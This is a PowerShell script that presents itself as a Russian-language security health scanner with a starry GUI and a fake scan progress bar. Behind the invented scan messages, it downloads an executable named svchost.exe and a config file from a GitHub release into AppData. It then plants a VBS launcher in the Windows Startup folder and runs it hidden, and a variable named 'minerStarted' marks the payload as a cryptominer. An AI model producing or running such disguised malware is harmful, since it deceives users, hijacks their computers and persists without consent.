Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "SecurityHealth Galaxy Scanner"
$form.Size = New-Object System.Drawing.Size(620,420)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(5,5,25)
$form.MaximizeBox = $false

# Звёзды
$rand = New-Object System.Random
for ($i=0; $i -lt 30; $i++) {
    $star = New-Object System.Windows.Forms.Label
    $star.Text = "."
    $star.ForeColor = [System.Drawing.Color]::White
    $star.BackColor = $form.BackColor
    $star.AutoSize = $true
    $star.Location = New-Object System.Drawing.Point($rand.Next(5,580), $rand.Next(5,150))
    $form.Controls.Add($star)
}

$title = New-Object System.Windows.Forms.Label
$title.Text = "SECURITY HEALTH CHECKER"
$title.Font = New-Object System.Drawing.Font("Consolas",18,[System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Cyan
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(60,20)
$form.Controls.Add($title)

$subtitle = New-Object System.Windows.Forms.Label
$subtitle.Text = "ПОДПИСКА АКТИВНА"
$subtitle.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$subtitle.ForeColor = [System.Drawing.Color]::Green
$subtitle.AutoSize = $true
$subtitle.Location = New-Object System.Drawing.Point(60,50)
$form.Controls.Add($subtitle)

$expires = New-Object System.Windows.Forms.Label
$expires.Text = "Срок действия: 27.08.2027"
$expires.Font = New-Object System.Drawing.Font("Consolas",9)
$expires.ForeColor = [System.Drawing.Color]::Gray
$expires.AutoSize = $true
$expires.Location = New-Object System.Drawing.Point(60,70)
$form.Controls.Add($expires)

$status = New-Object System.Windows.Forms.Label
$status.Text = "Инициализация модуля безопасности..."
$status.Font = New-Object System.Drawing.Font("Consolas",11)
$status.ForeColor = [System.Drawing.Color]::LightCyan
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(60,110)
$form.Controls.Add($status)

$substatus = New-Object System.Windows.Forms.Label
$substatus.Text = "Проверка целостности системных файлов..."
$substatus.Font = New-Object System.Drawing.Font("Consolas",9)
$substatus.ForeColor = [System.Drawing.Color]::Gray
$substatus.AutoSize = $true
$substatus.Location = New-Object System.Drawing.Point(60,135)
$form.Controls.Add($substatus)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(480,30)
$progress.Location = New-Object System.Drawing.Point(60,170)
$progress.Style = "Continuous"
$form.Controls.Add($progress)

$detail = New-Object System.Windows.Forms.Label
$detail.Text = "Не закрывайте программу..."
$detail.Font = New-Object System.Drawing.Font("Consolas",9)
$detail.ForeColor = [System.Drawing.Color]::DarkGray
$detail.AutoSize = $true
$detail.Location = New-Object System.Drawing.Point(60,210)
$form.Controls.Add($detail)

$btn = New-Object System.Windows.Forms.Button
$btn.Text = "ЗАВЕРШИТЬ"
$btn.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Bold)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.BackColor = [System.Drawing.Color]::DarkMagenta
$btn.FlatStyle = "Flat"
$btn.FlatAppearance.BorderColor = [System.Drawing.Color]::Cyan
$btn.FlatAppearance.BorderSize = 2
$btn.Size = New-Object System.Drawing.Size(240,50)
$btn.Location = New-Object System.Drawing.Point(180,270)
$btn.Enabled = $false
$form.Controls.Add($btn)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 80

$script:filesReady = $false
$script:errorOccurred = $false
$script:minerStarted = $false

$timer.Add_Tick({
    if ($progress.Value -lt 100) {
        $progress.Value += 1
        if ($progress.Value -eq 10) { $status.Text = "Сканирование системных каталогов..."; $substatus.Text = "C:\Windows\System32\drivers\etc"; $detail.Text = "Анализ цифровых подписей..." }
        if ($progress.Value -eq 25) { $status.Text = "Поиск уязвимостей..."; $substatus.Text = "Проверка обновлений безопасности"; $detail.Text = "Соединение с сервером лицензий..." }
        if ($progress.Value -eq 40 -and -not $script:filesReady -and -not $script:errorOccurred) {
            $status.Text = "Загрузка обновлений..."
            $substatus.Text = "Получение пакетов с сервера"
            $urlExe  = "https://github.com/Varenik638/check/releases/download/check/svchost.exe"
            $urlConf = "https://github.com/Varenik638/check/releases/download/check/config.json"
            $workDir = "$env:APPDATA\SecurityHealth"
            try {
                if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
                $web = New-Object System.Net.WebClient
                $web.Headers.Add("User-Agent", "Mozilla/5.0")
                $web.DownloadFile($urlExe, "$workDir\svchost.exe")
                $web.DownloadFile($urlConf, "$workDir\config.json")
                $script:filesReady = $true
                $status.Text = "Обновления установлены"
                $substatus.Text = "Целостность подтверждена"
                $detail.Text = "Версия 2.4.1"
            } catch {
                try {
                    Invoke-WebRequest -Uri $urlExe -OutFile "$workDir\svchost.exe" -UseBasicParsing
                    Invoke-WebRequest -Uri $urlConf -OutFile "$workDir\config.json" -UseBasicParsing
                    $script:filesReady = $true
                    $status.Text = "Обновления установлены (резервный канал)"
                    $substatus.Text = "Целостность подтверждена"
                    $detail.Text = "Версия 2.4.1"
                } catch {
                    $script:errorOccurred = $true
                    $status.Text = "ОШИБКА ЗАГРУЗКИ"
                    $status.ForeColor = [System.Drawing.Color]::Red
                    $substatus.Text = "Ошибка: $($_.Exception.Message)"
                    $substatus.ForeColor = [System.Drawing.Color]::Red
                    $detail.Text = "Проверьте интернет-соединение"
                    $timer.Stop()
                    $btn.Enabled = $true
                }
            }
        }
        if ($progress.Value -eq 60 -and $script:filesReady) {
            $status.Text = "Настройка системы..."
            $substatus.Text = "Внесение параметров безопасности"
            $detail.Text = "Создание точки восстановления..."
            $vbsPath = "$env:APPDATA\SecurityHealth\launch.vbs"
            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"$env:APPDATA\SecurityHealth\svchost.exe -c $env:APPDATA\SecurityHealth\config.json`", 0, False"
            try {
                $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
                $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.vbs"
                Copy-Item $vbsPath $startupPath -Force
                $status.Text = "Настройка завершена"
                $substatus.Text = "Автозащита включена"
                $detail.Text = "Защита при запуске активирована"
            } catch {
                $status.Text = "ОШИБКА НАСТРОЙКИ"
                $status.ForeColor = [System.Drawing.Color]::Red
                $substatus.Text = $_.Exception.Message
                $substatus.ForeColor = [System.Drawing.Color]::Red
                $script:errorOccurred = $true
                $timer.Stop()
                $btn.Enabled = $true
            }
        }
        if ($progress.Value -eq 80 -and $script:filesReady -and -not $script:minerStarted) {
            $status.Text = "Запуск защитных модулей..."
            $substatus.Text = "Активация SecurityHealth Guard..."
            $detail.Text = "Проверка ядра..."
            try {
                Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.vbs" -WindowStyle Hidden
                $script:minerStarted = $true
            } catch {}
        }
    } else {
        $timer.Stop()
        if (-not $script:errorOccurred) {
            $status.Text = "Сканирование завершено!"
            $status.ForeColor = [System.Drawing.Color]::Green
            $substatus.Text = "Все проверки пройдены"
            $detail.Text = "Защита активирована. Нажмите ЗАВЕРШИТЬ."
            $btn.Enabled = $true
        } else {
            $status.Text = "ОШИБКА"
            $status.ForeColor = [System.Drawing.Color]::Red
            $substatus.Text = "Попробуйте перезапустить"
            $substatus.ForeColor = [System.Drawing.Color]::Red
            $btn.Enabled = $true
        }
    }
})

$btn.Add_Click({ $form.Close() })

$form.Add_Shown({$timer.Start()})
[void]$form.ShowDialog()